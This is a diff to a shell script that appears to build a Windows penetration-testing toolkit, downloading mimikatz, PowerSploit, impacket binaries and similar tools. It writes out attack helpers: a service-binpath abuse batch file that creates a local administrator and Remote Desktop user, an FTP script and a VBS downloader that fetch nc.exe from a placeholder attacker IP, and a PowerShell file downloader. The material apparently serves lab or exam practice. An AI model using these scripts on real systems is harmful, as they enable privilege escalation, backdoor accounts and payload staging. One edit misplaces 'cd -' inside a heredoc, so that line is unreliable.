@@ -8,9 +8,9 @@ cd public/tools_windows
     mv winPEAS.exe winPEAS-86.exe
 
     banner "shared_windows - copy mimikatz"
-    cp ../../tools_windows/mimikatz/Win32/mimikatz.exe mimikatz.exe 
-    cp ../../tools_windows/mimikatz/Win32/mimilove.exe mimilove.exe 
-    cp ../../tools_windows/mimikatz/x64/mimikatz.exe mimikatz64.exe 
+    cp ../../tools/windows/mimikatz/Win32/mimikatz.exe mimikatz.exe 
+    cp ../../tools/windows/mimikatz/Win32/mimilove.exe mimilove.exe 
+    cp ../../tools/windows/mimikatz/x64/mimikatz.exe mimikatz64.exe 
 
     # TODO BUILD Watson
     #wget https://github.com/rasta-mouse/Watson/releases/download/2.0/Watson_Net35.exe
@@ -110,6 +110,10 @@ cd public/tools_windows
     banner "shared_windows - https://github.com/rasta-mouse/Sherlock.git"
     wget -N https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1
 
+    # Compile
+    # banner "shared_windows - https://github.com/GhostPack/Seatbelt"
+    # git clone --depth=1 --recursive https://github.com/GhostPack/Seatbelt
+
     banner "shared_windows - https://github.com/PowerShellMafia/PowerSploit.git"
     git clone --depth=1 --recursive https://github.com/PowerShellMafia/PowerSploit.git
 
@@ -131,40 +135,106 @@ cd public/tools_windows
     banner "shared_windows - https://github.com/Kevin-Robertson/Powermad.git"
     git clone --depth=1 --recursive https://github.com/Kevin-Robertson/Powermad.git
 
+    banner "shared_windows - https://github.com/Ben0xA/nps"
+    wget -N https://github.com/Ben0xA/nps/raw/master/binary/nps.zip
+    unzip nps.zip
+    rm nps.zip
+
+    rm -rf impacketbins
+    mkdir impacketbins
+    cd impacketbins
+        wget -nc "https://github.com/`curl https://github.com/ropnop/impacket_static_binaries/releases | grep "/ropnop/impacket_static_binaries/releases/download/" | cut -d "\"" -f2 | grep "impacket_windows" | head -1`"
+        unzip impacket_windows_binaries.zip
+    cd ..
+
+    if [ ! -f EyeWitness.exe ]; then
+        wget https://www.christophertruncer.com/InstallMe/EyeWitness.zip
+        unzip EyeWitness -d EyeWitness
+        mv EyeWitness/EyeWitness.exe .
+        rm -rf EyeWitness
+    fi
+
+    if [ ! -f nmap.zip ]; then
+        wget -N https://nmap.org/dist/nmap-7.80-win32.zip
+        mv nmap-7.80-win32.zip nmap.zip
+    fi
+
 banner "shared_windows - service_abuse_create_user.bat"
 cat <<\EOT >service_abuse_create_user.bat
-  sc config WebDriveService binpath= "net user /add amxuser1 amxpass1234"
-  sc config WebDriveService obj= ".\LocalSystem" password= ""
-  sc qc WebDriveService
-  net stop WebDriveService
-  net start WebDriveService
-  net start WebDriveService
+    sc config WebDriveService binpath= "net user /add amxuser1 amxpass1234"
+    sc config WebDriveService obj= ".\LocalSystem" password= ""
+    sc qc WebDriveService
+    net stop WebDriveService
+    net start WebDriveService
+    net start WebDriveService
 
-  sc config WebDriveService binpath= "net localgroup administrators amxuser1 /add"
-  sc config WebDriveService obj= ".\LocalSystem" password= ""
-  sc qc WebDriveService
-  net stop WebDriveService
-  net start WebDriveService
-  net start WebDriveService
+    sc config WebDriveService binpath= "net localgroup administrators amxuser1 /add"
+    sc config WebDriveService obj= ".\LocalSystem" password= ""
+    sc qc WebDriveService
+    net stop WebDriveService
+    net start WebDriveService
+    net start WebDriveService
 
-  sc config WebDriveService binpath= "net localgroup \"Remote Desktop Users\" amxuser1 /add"
-  sc config WebDriveService obj= ".\LocalSystem" password= ""
-  sc qc WebDriveService
-  net stop WebDriveService
-  net start WebDriveService
-  net start WebDriveService
+    sc config WebDriveService binpath= "net localgroup \"Remote Desktop Users\" amxuser1 /add"
+    sc config WebDriveService obj= ".\LocalSystem" password= ""
+    sc qc WebDriveService
+    net stop WebDriveService
+    net start WebDriveService
+    net start WebDriveService
 EOT
 
-banner "shared_windows - powershell_download_file.bat"
-cat <<\EOT >powershell_download_file.bat
-  echo $storageDir = $pwd > wget.ps1
-  echo $webclient = New-Object System.Net.WebClient >>wget.ps1 
-  echo $url = "http://<URL>" >>wget.ps1 
-  echo $file = "example.exe" >>wget.ps1
-  echo $webclient.DownloadFile($url,$file) >>wget.ps1
+banner "shared_windows - wget.ps1.bat"
+cat <<\EOT >wget.ps1.bat
+    echo $storageDir = $pwd > wget.ps1
+    echo $webclient = New-Object System.Net.WebClient >>wget.ps1 
+    echo $url = "http://<URL>" >>wget.ps1 
+    echo $file = "example.exe" >>wget.ps1
+    echo $webclient.DownloadFile($url,$file) >>wget.ps1
 EOT
 
+banner "shared_windows - wget.ftp.bat"
+cat <<\EOT >ftp_download_file.bat
+    echo open <attacker_ip> 21> ftp.txt
+    echo USER offsec>> ftp.txt
+    echo ftp>> ftp.txt
+    echo bin >> ftp.txt
+    echo GET nc.exe >> ftp.txt
+    echo bye >> ftp.txt
+
+    ftp -v -n -s:ftp.txt
+EOT
+
+banner "shared_windows - wget.vbs.bat"
+cat <<\EOT >wget.vbs.bat
+    echo strUrl = WScript.Arguments.Item(0) > wget.vbs
+    echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
+    echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
+    echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
+    echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
+    echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
+    echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
+    echo Err.Clear >> wget.vbs
+    echo Set http = Nothing >> wget.vbs
+    echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
+    echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
+    echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
+    echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
+    echo http.Open "GET",strURL,False >> wget.vbs
+    echo http.Send >> wget.vbs
+    echo varByteArray = http.ResponseBody >> wget.vbs
+    echo Set http = Nothing >> wget.vbs
+    echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
+    echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs
+    echo strData = "" >> wget.vbs
+    echo strBuffer = "" >> wget.vbs
+    echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
+    echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs
+    echo Next >> wget.vbs
+    echo ts.Close >> wget.vbs
+
+    # cscript wget.vbs http://<attacker_ip>/nc.exe nc.exe
 cd -
+EOT
 
 rm -rf public/tools_windows/bin
 mkdir -p public/tools_windows/bin
